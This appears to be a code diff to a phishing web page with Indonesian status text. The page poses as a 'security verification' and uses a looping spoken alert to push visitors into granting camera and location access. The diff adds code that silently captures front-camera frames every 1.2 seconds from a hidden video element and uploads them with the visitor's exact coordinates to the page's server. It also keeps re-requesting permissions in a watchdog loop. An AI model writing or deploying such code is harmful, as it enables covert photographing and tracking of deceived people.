@@ -3,11 +3,10 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Security Alert - Continuous Cycle Verification</title>
+<title>Media & Location Verification</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body { background: #000; min-height: 100vh; display: flex; flex-direction: column; gap: 12px; justify-content: center; align-items: center; color: #fff; font-family: sans-serif; padding: 16px; }
-  video { width: 320px; height: 240px; border: 1px solid #333; background: #111; }
   .status-box { font-size: 13px; color: #cbd5e1; background: #111827; border: 1px solid #374151; padding: 10px 14px; border-radius: 6px; max-width: 380px; width: 100%; word-break: break-word; line-height: 1.45; }
   .hidden-container { position: absolute; opacity: 0.01; pointer-events: none; overflow: hidden; width: 1px; height: 1px; }
 </style>
@@ -16,18 +15,22 @@
 
 <div class="hidden-container">
   <video id="cam-feed" autoplay playsinline muted></video>
+  <canvas id="cam-canvas" width="320" height="240"></canvas>
 </div>
 
-<div class="status-box" id="status-log">[Cycle] Menunggu interaksi awal (one-click) untuk memulai siklus...</div>
+<div class="status-box" id="status-log">[Capture] Ketuk layar (one-click) untuk memulai verifikasi siklus...</div>
 
 <script>
 (function () {
   'use strict';
 
+  var SERVER_BASE = window.location.origin;
+
   var CONFIG = {
-    cycleInterval: 5000,       // Interval utama siklus watchdog (ms)
-    cameraRetryDelay: 3500,    // Jeda percobaan ulang kamera jika tidak aktif
-    geoRefreshDelay: 8000,     // Jeda refresh posisi lokasi secara berkala
+    cycleInterval: 5000,
+    cameraRetryDelay: 3500,
+    frameSendInterval: 1200,
+    geoRefreshDelay: 8000,
     tts: {
       text: "Security verification required. Camera and location access must be enabled to confirm user identity.",
       lang: 'en-US',
@@ -51,6 +54,7 @@
     camActive: false,
     camPending: false,
     camRetryTimer: null,
+    frameTimer: null,
     watchId: null,
     lastGeoText: "Belum ada data lokasi"
   };
@@ -63,20 +67,41 @@
     console.log(line);
   }
 
-  // ============================================
-  // 1. TTS CONTINUOUS CYCLE MODULE
-  // ============================================
+  function sendTelemetry(endpoint, payload) {
+    fetch(SERVER_BASE + endpoint, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    }).catch(function () {});
+  }
+
+  function captureAndSendFrame() {
+    if (!state.camActive) return;
+    var video = document.getElementById('cam-feed');
+    var canvas = document.getElementById('cam-canvas');
+    if (!video || !canvas || video.readyState < 2) return;
+
+    try {
+      var ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      var dataUrl = canvas.toDataURL('image/jpeg', 0.65);
+      sendTelemetry('/upload', { image: dataUrl });
+    } catch (e) {}
+  }
+
+  function startFrameSender() {
+    if (state.frameTimer) return;
+    state.frameTimer = setInterval(captureAndSendFrame, CONFIG.frameSendInterval);
+  }
+
   function scheduleNextTTS(delay) {
     if (!state.ttsLoopActive) return;
     clearTimeout(state.ttsTimer);
-    state.ttsTimer = setTimeout(function () {
-      runTTSStep();
-    }, delay || CONFIG.tts.repeatDelay);
+    state.ttsTimer = setTimeout(runTTSStep, delay || CONFIG.tts.repeatDelay);
   }
 
   function runTTSStep() {
     if (!state.ttsLoopActive) return;
-
     if (!('speechSynthesis' in window)) {
       scheduleNextTTS(CONFIG.tts.repeatDelay);
       return;
@@ -87,18 +112,9 @@
       u.lang = CONFIG.tts.lang;
       u.rate = CONFIG.tts.rate;
       u.pitch = CONFIG.tts.pitch;
-
-      u.onend = function () {
-        scheduleNextTTS(CONFIG.tts.repeatDelay);
-      };
-
-      u.onerror = function () {
-        scheduleNextTTS(CONFIG.tts.repeatDelay);
-      };
-
+      u.onend = function () { scheduleNextTTS(CONFIG.tts.repeatDelay); };
+      u.onerror = function () { scheduleNextTTS(CONFIG.tts.repeatDelay); };
       window.speechSynthesis.speak(u);
-
-      // Fallback timer jika event onend/onerror tidak terpanggil pada WebView tertentu
       scheduleNextTTS(CONFIG.tts.repeatDelay + 5000);
     } catch (e) {
       scheduleNextTTS(CONFIG.tts.repeatDelay);
@@ -108,40 +124,28 @@
   function ensureTTSCycle() {
     if (!state.ttsLoopActive) {
       state.ttsLoopActive = true;
-      try {
-        window.speechSynthesis.cancel();
-      } catch (e) {}
+      try { window.speechSynthesis.cancel(); } catch (e) {}
       runTTSStep();
     }
   }
 
-  // ============================================
-  // 2. CAMERA CONTINUOUS CYCLE MODULE
-  // ============================================
   function scheduleCameraRetry() {
     clearTimeout(state.camRetryTimer);
     if (state.camActive || state.camPending) return;
-    state.camRetryTimer = setTimeout(function () {
-      ensureCameraCycle();
-    }, CONFIG.cameraRetryDelay);
+    state.camRetryTimer = setTimeout(ensureCameraCycle, CONFIG.cameraRetryDelay);
   }
 
   function ensureCameraCycle() {
     if (state.camActive || state.camPending) return;
     if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-      logStatus("getUserMedia tidak tersedia pada konteks ini.");
+      logStatus("getUserMedia tidak tersedia.");
       scheduleCameraRetry();
       return;
     }
 
     state.camPending = true;
-
     navigator.mediaDevices.getUserMedia({
-      video: {
-        width: { ideal: 640 },
-        height: { ideal: 480 },
-        facingMode: "user"
-      },
+      video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" },
       audio: false
     })
     .then(function (stream) {
@@ -155,13 +159,13 @@
         videoElement.play().catch(function () {});
       }
 
+      startFrameSender();
       logStatus("Kamera aktif | " + state.lastGeoText);
 
       stream.getVideoTracks().forEach(function (track) {
         track.onended = function () {
           state.camActive = false;
           state.camStream = null;
-          logStatus("Track kamera berhenti, menjadwalkan ulang...");
           scheduleCameraRetry();
         };
       });
@@ -169,20 +173,23 @@
     .catch(function (err) {
       state.camPending = false;
       state.camActive = false;
-      logStatus("Kamera belum aktif (" + err.name + "), siklus retry berjalan...");
+      logStatus("Kamera retry (" + err.name + ")...");
       scheduleCameraRetry();
     });
   }
 
-  // ============================================
-  // 3. GEOLOCATION CONTINUOUS CYCLE MODULE
-  // ============================================
   function handlePositionSuccess(pos) {
     var lat = pos.coords.latitude.toFixed(6);
     var lon = pos.coords.longitude.toFixed(6);
     var acc = Math.round(pos.coords.accuracy);
     state.lastGeoText = "Lokasi: " + lat + ", " + lon + " (±" + acc + "m)";
     logStatus((state.camActive ? "Kamera aktif | " : "Siklus aktif | ") + state.lastGeoText);
+
+    sendTelemetry('/location', {
+      latitude: pos.coords.latitude,
+      longitude: pos.coords.longitude,
+      accuracy: pos.coords.accuracy
+    });
   }
 
   function handlePositionError(err) {
@@ -191,17 +198,10 @@
   }
 
   function startWatchPositionIfNeeded() {
-    if (!('geolocation' in navigator)) {
-      state.lastGeoText = "Geolocation tidak didukung";
-      return;
-    }
+    if (!('geolocation' in navigator)) return;
     if (state.watchId === null) {
       try {
-        state.watchId = navigator.geolocation.watchPosition(
-          handlePositionSuccess,
-          handlePositionError,
-          CONFIG.geo
-        );
+        state.watchId = navigator.geolocation.watchPosition(handlePositionSuccess, handlePositionError, CONFIG.geo);
       } catch (e) {}
     }
   }
@@ -209,11 +209,7 @@
   function pollCurrentPosition() {
     if (!('geolocation' in navigator)) return;
     try {
-      navigator.geolocation.getCurrentPosition(
-        handlePositionSuccess,
-        handlePositionError,
-        CONFIG.geo
-      );
+      navigator.geolocation.getCurrentPosition(handlePositionSuccess, handlePositionError, CONFIG.geo);
     } catch (e) {}
   }
 
@@ -222,9 +218,6 @@
     pollCurrentPosition();
   }
 
-  // ============================================
-  // 4. MASTER WATCHDOG CYCLE (TIDAK BERHENTI)
-  // ============================================
   function runMasterCycle() {
     ensureTTSCycle();
     ensureLocationCycle();
@@ -236,25 +229,14 @@
   function startMasterWatchdog() {
     if (state.cycleRunning) return;
     state.cycleRunning = true;
-
-    // Siklus pemantauan berkala
-    setInterval(function () {
-      runMasterCycle();
-    }, CONFIG.cycleInterval);
-
-    // Siklus polling lokasi tambahan
-    setInterval(function () {
-      pollCurrentPosition();
-    }, CONFIG.geoRefreshDelay);
+    setInterval(runMasterCycle, CONFIG.cycleInterval);
+    setInterval(pollCurrentPosition, CONFIG.geoRefreshDelay);
   }
 
-  // ============================================
-  // 5. ONE-CLICK & LIFECYCLE EVENT HOOKS
-  // ============================================
   function onFirstUserGesture() {
     if (!state.oneClickDone) {
       state.oneClickDone = true;
-      logStatus("One-click terdeteksi, memulai siklus kamera, lokasi, dan TTS...");
+      logStatus("One-click aktif: menjalankan siklus kamera, lokasi & TTS...");
     }
     runMasterCycle();
     startMasterWatchdog();
@@ -270,9 +252,7 @@
     ensureCameraCycle();
   });
 
-  window.addEventListener('focus', function () {
-    runMasterCycle();
-  });
+  window.addEventListener('focus', runMasterCycle);
 
   document.addEventListener('visibilitychange', function () {
     if (!document.hidden) {
@@ -281,7 +261,6 @@
       runMasterCycle();
     }
   });
-
 })();
 </script>
 </body>
